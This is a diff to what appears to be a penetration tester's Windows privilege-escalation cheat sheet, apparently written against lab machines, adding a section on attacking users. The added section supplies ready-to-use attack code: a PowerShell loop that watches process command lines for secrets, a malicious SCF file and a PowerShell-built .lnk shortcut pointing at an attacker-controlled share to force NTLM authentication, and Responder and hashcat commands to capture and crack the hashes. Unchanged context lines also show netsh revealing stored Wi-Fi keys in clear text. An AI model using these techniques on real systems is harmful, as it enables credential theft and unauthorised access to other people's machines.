@@ -29,7 +29,10 @@
   - [Weak Service Permissions](#weak-service-permissions)
   - [Unquoted Service Path](#unquoted-service-path)
   - [Weak Registry Permissions](#weak-registry-permissions)          
-
+- [Kernal Exploits](#kernal-exploits)
+- [Vulnerable Services](#vulnerable-services)
+- [Credential Theft](#credential-theft)
+- [Interacting with Users]()
 
 # tools
 - [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
@@ -899,4 +902,53 @@ reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
 ```powershell
 netsh wlan show profile
 netsh wlan show profile <profilename> key=clear
+```
+
+# Interacting with Users
+### Process Command Lines
+```powershell
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+```
+
+### Malicious SCF File
+- create the following file and name it something like `@Inventory.scf`
+- We put an @ at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer. 
+```
+[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+- Starting Responder
+```shell
+sudo responder -wrf -v -I tun0
+
+hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+```
+
+> Note:
+> Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file
+
+### Malicious .lnk File
+- create .lnk file using [lnkbomb](https://github.com/dievus/lnkbomb)
+- create .lnk file using powershell
+```powershell
+
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
 ```
